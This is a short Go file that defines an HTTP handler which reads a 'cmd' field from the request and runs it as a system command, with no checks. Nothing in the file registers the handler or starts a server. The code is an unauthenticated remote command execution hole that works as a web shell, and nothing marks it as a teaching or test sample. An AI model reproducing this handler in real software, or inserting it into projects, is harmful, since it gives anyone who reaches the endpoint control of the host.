package main

import (
	"net/http"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := r.FormValue("cmd")
	exec.Command(cmd).Run()
}
